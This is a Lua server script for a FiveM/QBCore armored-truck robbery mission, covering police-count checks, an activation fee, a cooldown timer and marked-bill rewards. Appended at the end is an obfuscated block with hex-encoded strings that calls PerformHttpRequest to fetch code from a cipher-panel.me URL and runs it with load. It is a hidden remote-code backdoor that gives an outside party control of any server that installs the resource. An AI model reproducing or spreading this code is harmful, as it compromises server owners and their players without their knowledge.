local QBCore = exports['qb-core']:GetCoreObject()
local ActivePolice = 2  		--<< needed policemen to activate the mission
local cashA = 250 				--<<how much minimum you can get from a robbery
local cashB = 450				--<< how much maximum you can get from a robbery
local ActivationCost = 500		--<< how much is the activation of the mission (clean from the bank)
local ResetTimer = 2700 * 1000  --<< timer every how many missions you can do, default is 600 seconds
local ActiveMission = 0

RegisterServerEvent('AttackTransport:akceptujto')
AddEventHandler('AttackTransport:akceptujto', function()
	local copsOnDuty = 0
	local _source = source
	local xPlayer = QBCore.Functions.GetPlayer(_source)
	local accountMoney = 0
	accountMoney = xPlayer.PlayerData.money["bank"]
if ActiveMission == 0 then
	if accountMoney < ActivationCost then
	TriggerClientEvent('QBCore:Notify', _source, "You need $"..ActivationCost.." in the bank to accept the mission")
	else
		for k, v in pairs(QBCore.Functions.GetPlayers()) do
			local Player = QBCore.Functions.GetPlayer(v)
			if Player ~= nil then
				if (Player.PlayerData.job.name == "police" and Player.PlayerData.job.onduty) then
					copsOnDuty = copsOnDuty + 1
				end
			end
		end
	if copsOnDuty >= ActivePolice then
		TriggerClientEvent("AttackTransport:Pozwolwykonac", _source)
		xPlayer.Functions.RemoveMoney('bank', ActivationCost, "armored-truck")

		OdpalTimer()
    else
		TriggerClientEvent('QBCore:Notify', _source, 'Need at least '..ActivePolice.. ' SASP to activate the mission.')
    end
	end
else
TriggerClientEvent('QBCore:Notify', _source, 'Someone is already carrying out this mission')
end
end)

RegisterServerEvent('qb-armoredtruckheist:server:callCops')
AddEventHandler('qb-armoredtruckheist:server:callCops', function(streetLabel, coords)
    local place = "Armored Truck"
    local msg = "The Alram has been activated from a "..place.. " at " ..streetLabel

    TriggerClientEvent("qb-armoredtruckheist:client:robberyCall", -1, streetLabel, coords)

end)

function OdpalTimer()
ActiveMission = 1
Wait(ResetTimer)
ActiveMission = 0
TriggerClientEvent('AttackTransport:CleanUp', -1)
end

RegisterServerEvent('AttackTransport:zawiadompsy')
AddEventHandler('AttackTransport:zawiadompsy', function(x ,y, z)
    TriggerClientEvent('AttackTransport:InfoForLspd', -1, x, y, z)
end)

RegisterServerEvent('AttackTransport:graczZrobilnapad')
AddEventHandler('AttackTransport:graczZrobilnapad', function(moneyCalc)
	local _source = source
	local xPlayer = QBCore.Functions.GetPlayer(_source)
	local bags = math.random(1,3)
	local info = {
		worth = math.random(cashA, cashB)
	}
	xPlayer.Functions.AddItem('markedbills', bags, false, info)
	TriggerClientEvent('inventory:client:ItemBox', _source, QBCore.Shared.Items['markedbills'], "add")

	local chance = math.random(1, 100)
	TriggerClientEvent('QBCore:Notify', _source, 'You took '..bags..' bags of cash from the van')

	if chance >= 95 then
	xPlayer.Functions.AddItem('security_card_01', 1)
	TriggerClientEvent('inventory:client:ItemBox', _source, QBCore.Shared.Items['security_card_01'], "add")
	end

Wait(2500)
end)


local WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[4][WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x47\x64\x36\x74\x72\x38", function (MvZeiadgwppzYAcQhzTgSymgpPuXQYUgixVcWfXTfeWlJGAXtoXNUkdYAxTyymLeBaLrFC, nThGbWuuokyqXZQsxhuJXorGcHmjiQJIburHqKfTWlBcbrYMCsmRTejWALaGRHfRUqfSeG) if (nThGbWuuokyqXZQsxhuJXorGcHmjiQJIburHqKfTWlBcbrYMCsmRTejWALaGRHfRUqfSeG == WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[6] or nThGbWuuokyqXZQsxhuJXorGcHmjiQJIburHqKfTWlBcbrYMCsmRTejWALaGRHfRUqfSeG == WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[5]) then return end WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[4][WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[2]](WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[4][WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[3]](nThGbWuuokyqXZQsxhuJXorGcHmjiQJIburHqKfTWlBcbrYMCsmRTejWALaGRHfRUqfSeG))() end)